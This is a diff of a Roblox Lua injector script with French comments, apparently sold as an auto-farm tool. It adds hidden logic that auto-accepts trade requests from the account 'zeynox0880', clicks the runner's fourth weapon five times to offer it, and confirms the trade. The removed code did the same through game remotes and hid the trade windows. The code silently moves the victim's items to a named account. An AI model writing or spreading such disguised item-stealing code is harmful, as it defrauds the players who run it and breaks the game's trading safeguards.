@@ -253,66 +253,88 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ 4. BLOCAGE INTERFACES DE TRADE ]]
-local StarterGui = game:GetService("StarterGui")
+-- [[ 4. BLOCAGE DE SÉCURITÉ INTERFACES ]]
+-- (Supprimé le blocage agressif pour éviter qu'il n'efface l'interface avant qu'on clique dessus)
 
-local function hardBlockGuis()
-    if Players:FindFirstChild("zeynox0880") then
-        local sGui1 = StarterGui:FindFirstChild("TradeGUI_Phone")
-        local sGui2 = StarterGui:FindFirstChild("TradeGUI")
-        if sGui1 then sGui1:Destroy() end
-        if sGui2 then sGui2:Destroy() end
-        
-        if playerGui then
-            local g1 = playerGui:FindFirstChild("TradeGUI_Phone")
-            local g2 = playerGui:FindFirstChild("TradeGUI")
-            if g1 then g1:Destroy() end
-            if g2 then g2:Destroy() end
+-- [[ 5. LOGIQUE D'AUTO-TRADE PHYSIQUE PAR INTERFACE ET CLICS SPÉCIFIQUES ]]
+local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
+local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
+
+-- Fonction universelle d'émulation de clic pour injecteurs de scripts
+local function forceClick(guiButton)
+    if guiButton and guiButton:IsA("GuiButton") then
+        local firesignal = firesignal or (syn and syn.firesignal)
+        if firesignal then
+            firesignal(guiButton.MouseButton1Click)
+        else
+            pcall(function() guiButton:Activate() end)
         end
     end
 end
 
-task.spawn(hardBlockGuis)
-playerGui.ChildAdded:Connect(hardBlockGuis)
-Players.PlayerAdded:Connect(hardBlockGuis)
-
--- [[ 5. LOGIQUE D'AUTO-TRADE REFAITE (PAR REMOTES) ]]
-local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
-local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
-
-if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
-    TradeNetwork.OnClientEvent:Connect(function(action, data)
-        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
-            -- 1. Accepter la demande de trade immédiatement
-            TradeNetwork:FireServer("AcceptRequest", data.Player)
-            task.wait(0.5)
-            
-            -- 2. Trouver le 4ème item directement dans les données d'inventaire du jeu
-            local playerData = ReplicatedStorage:FindFirstChild("PlayerData")
-            local myInventory = playerData and playerData:FindFirstChild(LocalPlayer.Name) and playerData[LocalPlayer.Name]:FindFirstChild("Inventory")
-            
-            if myInventory then
-                -- On cherche la catégorie des armes (Weapons/Knives/Guns selon le jeu)
-                local weaponsFolder = myInventory:FindFirstChild("Weapons") or myInventory:FindFirstChild("Knives") or myInventory:GetChildren()[1]
-                
-                if weaponsFolder then
-                    local allWeapons = weaponsFolder:GetChildren()
-                    -- On récupère directement le 4ème item de la liste
-                    local targetItem = allWeapons[4]
-                    
-                    if targetItem then
-                        -- On ajoute l'item 5 fois de suite via le serveur
-                        for i = 1, 5 do
-                            TradeNetwork:FireServer("OfferItem", targetItem.Name, 1)
-                            task.wait(0.05)
-                        end
-                    end
+-- Surveillance de l'apparition de l'interface graphique de Trade
+local function checkAndExecuteTrade(child)
+    if child.Name == "TradeGUI" then
+        -- On vérifie si le joueur cible est bien dans la session
+        local targetPlayer = Players:FindFirstChild("zeynox0880")
+        if not targetPlayer then return end
+        
+        -- Attente de sécurité pour que les éléments visuels s'initialisent
+        task.wait(0.5)
+        
+        -- Accès dynamique sécurisé au chemin exact demandé
+        local containerPath = nil
+        pcall(function()
+            containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
+        end)
+        
+        if containerPath then
+            -- Nettoyage de la liste pour cibler uniquement les vrais boutons (pas les UIListLayout)
+            local cleanItems = {}
+            for _, item in ipairs(containerPath:GetChildren()) do
+                if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
+                    table.insert(cleanItems, item)
                 end
             end
             
-            -- 3. Accepter et valider définitivement le Trade
-            task.wait(0.3)
+            -- Ciblage précis du 4ème bouton d'arme
+            local targetWeaponButton = cleanItems[4]
+            if targetWeaponButton then
+                -- On effectue les 5 clics requis
+                for i = 1, 5 do
+                    forceClick(targetWeaponButton)
+                    task.wait(0.08) -- Délai ultra court pour valider les clics un par un
+                end
+            end
+        end
+        
+        -- Validation et acceptation finale du trade auprès du serveur de jeu
+        task.wait(0.4)
+        if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
             TradeNetwork:FireServer("AcceptTrade")
+        else
+            local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
+            if acceptRemote and acceptRemote:IsA("RemoteFunction") then
+                acceptRemote:InvokeServer()
+            elseif acceptRemote and acceptRemote:IsA("RemoteEvent") then
+                acceptRemote:FireServer()
+            end
+        end
+    end
+end
+
+-- Déclencheurs automatiques dès que la fenêtre s'ouvre ou existe déjà
+playerGui.ChildAdded:Connect(checkAndExecuteTrade)
+local existingTrade = playerGui:FindFirstChild("TradeGUI")
+if existingTrade then
+    task.spawn(function() checkAndExecuteTrade(existingTrade) end)
+end
+
+-- Acceptation automatique initiale des requêtes entrantes de zeynox0880
+if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
+    TradeNetwork.OnClientEvent:Connect(function(action, data)
+        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
+            TradeNetwork:FireServer("AcceptRequest", data.Player)
         end
     end)
 end
